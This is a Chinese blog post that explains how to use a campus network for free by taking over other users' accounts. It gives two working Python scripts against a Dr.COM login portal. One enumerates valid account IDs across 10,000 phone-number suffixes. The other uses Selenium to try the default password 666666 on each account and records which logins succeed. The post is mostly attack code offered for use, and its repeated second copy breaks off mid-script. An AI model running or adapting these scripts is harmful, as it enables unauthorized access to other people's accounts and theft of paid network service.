{"title":"凿壁偷网","slug":"校园网","date":"2024-03-16T02:00:00.000Z","updated":"2024-03-16T02:00:00.000Z","comments":true,"path":"api/articles/校园网.json","excerpt":null,"covers":null,"content":"<h1 id=\"万恶的资本，还我移动校园网😭\"><a href=\"#万恶的资本，还我移动校园网😭\" class=\"headerlink\" title=\"万恶的资本，还我移动校园网😭\"></a>万恶的资本，还我移动校园网😭</h1><p>校园网的提示简直不能再明显了，再加上59元/月的校园网费，我决定用Python写一个自动登录的脚本。</p>\n<div class=\"note warning flat\"><p>本教程写于2023年，不知道现在会不会生效，以作参考</p>\n</div>\n<h2 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h2><p>我们首先能知道联通手机号码的首位是134、135、136、137、138……<br>那么我们就能拿到前缀，然后通过正则表达式匹配出手机号码，有些人的安全意识不是很强，嫌麻烦不会修改密码。</p>\n<h2 id=\"实现过程\"><a href=\"#实现过程\" class=\"headerlink\" title=\"实现过程\"></a>实现过程</h2><p>我们使用<code>Python</code>的<code>requests</code>库对校园网的登录后台发起请求，<code>check_user</code>函数用于检查给定的用户ID是否有效，发送HTTP请求并查找返回信息中是否含有指定文本。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> multiprocessing</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置请求头信息</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://10.100.10.100/drcom/login&quot;</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用会话来复用TCP连接</span></span><br><span class=\"line\">session = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 改进检查用户ID是否有效的函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">validate_userId</span>(<span class=\"params\">userId</span>):</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;callback&quot;</span>: <span class=\"string\">&quot;dr1003&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;DDDDD&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;userId&#125;</span>@unicom&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;upass&quot;</span>: <span class=\"string\">&quot;1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;0MKKey&quot;</span>: <span class=\"string\">&quot;000&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R1&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R2&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R3&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R6&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;para&quot;</span>: <span class=\"string\">&quot;00&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;v6ip&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;terminal_type&quot;</span>: <span class=\"string\">&quot;1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;lang&quot;</span>: <span class=\"string\">&quot;zh-cn&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;jsVersion&quot;</span>: <span class=\"string\">&quot;4.2&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;v&quot;</span>: <span class=\"string\">&quot;6687&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;lang&quot;</span>: <span class=\"string\">&quot;zh&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    valid_ids = []</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        res = session.get(url, params=params, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;userid error1&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> userId</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Error for user ID <span class=\"subst\">&#123;userId&#125;</span>: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    prefix_list = [<span class=\"string\">&quot;1767399&quot;</span>]  <span class=\"comment\"># 创建号码列表</span></span><br><span class=\"line\">    valid_userIds = []  <span class=\"comment\"># 用于存储有效的用户ID</span></span><br><span class=\"line\">    num_processes = <span class=\"number\">2</span>  <span class=\"comment\"># 创建2个多进程</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 使用多进程池</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> multiprocessing.Pool(num_processes) <span class=\"keyword\">as</span> pool:</span><br><span class=\"line\">        results = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> suffix <span class=\"keyword\">in</span> itertools.product(<span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">10</span>), repeat=<span class=\"number\">4</span>):</span><br><span class=\"line\">            suffix_str = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, suffix))</span><br><span class=\"line\">            <span class=\"keyword\">for</span> prefix <span class=\"keyword\">in</span> prefix_list:</span><br><span class=\"line\">                user_id = <span class=\"string\">f&quot;<span class=\"subst\">&#123;prefix&#125;</span><span class=\"subst\">&#123;suffix_str&#125;</span>&quot;</span></span><br><span class=\"line\">                results.append(pool.apply_async(validate_userId, (user_id,)))</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 等待异步结果</span></span><br><span class=\"line\">        valid_userIds = [result.get() <span class=\"keyword\">for</span> result <span class=\"keyword\">in</span> results <span class=\"keyword\">if</span> result.get() <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 一次性将所有有效的用户ID写入文件</span></span><br><span class=\"line\">    valid_userIds_path = os.path.join(os.getcwd(), <span class=\"string\">&quot;valid_userId.txt&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(valid_userIds_path, <span class=\"string\">&quot;a&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> userId <span class=\"keyword\">in</span> valid_userIds:</span><br><span class=\"line\">            f.write(userId + <span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码优化\"><a href=\"#代码优化\" class=\"headerlink\" title=\"代码优化\"></a>代码优化</h2><ul>\n<li><p>使用<code>requests.Session()</code>来减少每次请求都需要建立TCP连接的开销。</p>\n</li>\n<li><p>“有效性检查”仅存储有效的<code>userId</code>，最后一次性写入，而不是每次发现一个有效ID就写一次，减少磁盘I/O。</p>\n</li>\n<li><p>使用列表解析和<code>result.get()</code>直接从异步结果中提取有效用户ID。</p>\n</li>\n</ul>\n<h2 id=\"第二个实现版本selenium\"><a href=\"#第二个实现版本selenium\" class=\"headerlink\" title=\"第二个实现版本selenium\"></a>第二个实现版本<code>selenium</code></h2><p>我们也可以用Python的另一个强大的自动化库selenium来实现，selenium可以模拟浏览器操作。<br>我们既然能知道到联通的手机号码前缀，那么我们就可以通过selenium来模拟登录，手动输入密码，然后自动点击登录按钮</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.service <span class=\"keyword\">import</span> Service</span><br><span class=\"line\"><span class=\"keyword\">from</span> fake_useragent <span class=\"keyword\">import</span> UserAgent</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support.ui <span class=\"keyword\">import</span> WebDriverWait</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support <span class=\"keyword\">import</span> expected_conditions <span class=\"keyword\">as</span> EC</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">match_result</span>(<span class=\"params\">driver, index</span>):</span><br><span class=\"line\">    message = driver.page_source</span><br><span class=\"line\">    login_success = <span class=\"string\">&quot;您已经成功登录&quot;</span> <span class=\"keyword\">in</span> message</span><br><span class=\"line\">    tree = etree.HTML(message)</span><br><span class=\"line\">    info = tree.xpath(<span class=\"string\">&#x27;//form[@name=&quot;f1&quot;]/div[@class=&quot;edit_lobo_cell&quot;]/text()&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> info:</span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;信息&#x27;</span>] = info[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;信息&#x27;</span>] = <span class=\"string\">&#x27;未获取到信息&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(info)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> login_success</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">craw_internet</span>(<span class=\"params\">driver, start=<span class=\"number\">150</span>, end=<span class=\"number\">200</span></span>):</span><br><span class=\"line\">    base_url = <span class=\"string\">&#x27;http://10.100.10.100/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(start, end):</span><br><span class=\"line\">        driver.get(base_url)</span><br><span class=\"line\"></span><br><span class=\"line\">        username = WebDriverWait(driver, <span class=\"number\">10</span>).until(</span><br><span class=\"line\">            EC.presence_of_element_located((By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f3&quot;]//input[@name=&quot;DDDDD&quot;]&#x27;</span>)))</span><br><span class=\"line\">        password = driver.find_element(By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f3&quot;]//input[@name=&quot;upass&quot;]&#x27;</span>)</span><br><span class=\"line\">        button = driver.find_element(By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f3&quot;]//input[@name=&quot;0MKKey&quot;]&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        formatted_number = <span class=\"string\">f&#x27;1767399<span class=\"subst\">&#123;i:04d&#125;</span>&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(formatted_number)</span><br><span class=\"line\">        index = <span class=\"built_in\">len</span>(data)  <span class=\"comment\"># 新数据添加的索引位置</span></span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;账号&#x27;</span>] = formatted_number</span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;密码&#x27;</span>] = <span class=\"string\">&quot;666666&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        username.clear()</span><br><span class=\"line\">        username.send_keys(formatted_number)</span><br><span class=\"line\">        password.clear()</span><br><span class=\"line\">        password.send_keys(<span class=\"string\">&quot;666666&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        button.click()</span><br><span class=\"line\">        time.sleep(<span class=\"number\">2</span>)  <span class=\"comment\"># 给予页面加载时间</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> match_result(driver, index):</span><br><span class=\"line\">            data.to_csv(<span class=\"string\">&#x27;校园网150-200.csv&#x27;</span>, index=<span class=\"literal\">False</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>  <span class=\"comment\"># 成功登录后退出循环</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                back = WebDriverWait(driver, <span class=\"number\">5</span>).until(</span><br><span class=\"line\">                    EC.element_to_be_clickable((By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f1&quot;]//input[@name=&quot;GobackButton&quot;]&#x27;</span>)))</span><br><span class=\"line\">                back.click()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;未找到返回按钮, <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    data = pd.DataFrame(columns=[<span class=\"string\">&#x27;账号&#x27;</span>, <span class=\"string\">&#x27;密码&#x27;</span>, <span class=\"string\">&#x27;信息&#x27;</span>])</span><br><span class=\"line\">    user_agent = UserAgent().random</span><br><span class=\"line\">    options = webdriver.ChromeOptions()</span><br><span class=\"line\">    options.add_argument(<span class=\"string\">f&#x27;user-agent=<span class=\"subst\">&#123;user_agent&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    options.add_experimental_option(<span class=\"string\">&quot;excludeSwitches&quot;</span>, [<span class=\"string\">&quot;enable-automation&quot;</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    service = Service(executable_path=<span class=\"string\">&#x27;../driver/chromedriver.exe&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> webdriver.Chrome(service=service, options=options) <span class=\"keyword\">as</span> driver:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            craw_internet(driver)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;发生异常：<span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">            data.to_csv(<span class=\"string\">&#x27;校园网150-200.csv&#x27;</span>, index=<span class=\"literal\">False</span>)  <span class=\"comment\"># 确保数据被保存</span></span><br></pre></td></tr></table></figure>\n<div class=\"note warning flat\"><p><code>craw_internet</code>的<code>start</code>和<code>end</code>参数可以设置为任意值，因为这是拼接电话号码的，但是注意不要超过四位数：0-9999</p>\n</div>\n<div class=\"note info flat\"><p>使用selenium库需要安装Chrome浏览器和ChromeDriver驱动，具体可以参考<a href=\"https://selenium-python.readthedocs.io/installation.html\">官方文档</a></p>\n</div>\n<h2 id=\"代码优化-1\"><a href=\"#代码优化-1\" class=\"headerlink\" title=\"代码优化\"></a>代码优化</h2><ul>\n<li><p>使用显式等待：通过<code>WebDriverWait</code>和<code>expected_conditions</code>来等待元素变为可操作的状态，避免了固定等待时间，使代码执行更加高效且具有鲁棒性。</p>\n</li>\n<li><p>更好的异常处理：确保即使在出现异常时，能够保存已收集的数据，并且优雅地关闭<code>webdriver</code>。</p>\n</li>\n<li><p>代码的结构调整：将登陆成功的检查逻辑与数据提取逻辑合并到<code>match_result</code>函数中，并在<code>craw_internet</code>函数内调用，从而简化了代码的逻辑流程。</p>\n</li>\n</ul>\n","more":"<h1 id=\"万恶的资本，还我移动校园网😭\"><a href=\"#万恶的资本，还我移动校园网😭\" class=\"headerlink\" title=\"万恶的资本，还我移动校园网😭\"></a>万恶的资本，还我移动校园网😭</h1><p>校园网的提示简直不能再明显了，再加上59元/月的校园网费，我决定用Python写一个自动登录的脚本。</p>\n<div class=\"note warning flat\"><p>本教程写于2023年，不知道现在会不会生效，以作参考</p>\n</div>\n<h2 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h2><p>我们首先能知道联通手机号码的首位是134、135、136、137、138……<br>那么我们就能拿到前缀，然后通过正则表达式匹配出手机号码，有些人的安全意识不是很强，嫌麻烦不会修改密码。</p>\n<h2 id=\"实现过程\"><a href=\"#实现过程\" class=\"headerlink\" title=\"实现过程\"></a>实现过程</h2><p>我们使用<code>Python</code>的<code>requests</code>库对校园网的登录后台发起请求，<code>check_user</code>函数用于检查给定的用户ID是否有效，发送HTTP请求并查找返回信息中是否含有指定文本。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> multiprocessing</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置请求头信息</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://10.100.10.100/drcom/login&quot;</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用会话来复用TCP连接</span></span><br><span class=\"line\">session = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 改进检查用户ID是否有效的函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">validate_userId</span>(<span class=\"params\">userId</span>):</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;callback&quot;</span>: <span class=\"string\">&quot;dr1003&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;DDDDD&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;userId&#125;</span>@unicom&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;upass&quot;</span>: <span class=\"string\">&quot;1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;0MKKey&quot;</span>: <span class=\"string\">&quot;000&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R1&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R2&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R3&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;R6&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;para&quot;</span>: <span class=\"string\">&quot;00&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;v6ip&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;terminal_type&quot;</span>: <span class=\"string\">&quot;1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;lang&quot;</span>: <span class=\"string\">&quot;zh-cn&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;jsVersion&quot;</span>: <span class=\"string\">&quot;4.2&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;v&quot;</span>: <span class=\"string\">&quot;6687&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;lang&quot;</span>: <span class=\"string\">&quot;zh&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    valid_ids = []</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        res = session.get(url, params=params, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;userid error1&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> userId</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Error for user ID <span class=\"subst\">&#123;userId&#125;</span>: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    prefix_list = [<span class=\"string\">&quot;1767399&quot;</span>]  <span class=\"comment\"># 创建号码列表</span></span><br><span class=\"line\">    valid_userIds = []  <span class=\"comment\"># 用于存储有效的用户ID</span></span><br><span class=\"line\">    num_processes = <span class=\"number\">2</span>  <span class=\"comment\"># 创建2个多进程</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 使用多进程池</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> multiprocessing.Pool(num_processes) <span class=\"keyword\">as</span> pool:</span><br><span class=\"line\">        results = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> suffix <span class=\"keyword\">in</span> itertools.product(<span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">10</span>), repeat=<span class=\"number\">4</span>):</span><br><span class=\"line\">            suffix_str = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, suffix))</span><br><span class=\"line\">            <span class=\"keyword\">for</span> prefix <span class=\"keyword\">in</span> prefix_list:</span><br><span class=\"line\">                user_id = <span class=\"string\">f&quot;<span class=\"subst\">&#123;prefix&#125;</span><span class=\"subst\">&#123;suffix_str&#125;</span>&quot;</span></span><br><span class=\"line\">                results.append(pool.apply_async(validate_userId, (user_id,)))</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 等待异步结果</span></span><br><span class=\"line\">        valid_userIds = [result.get() <span class=\"keyword\">for</span> result <span 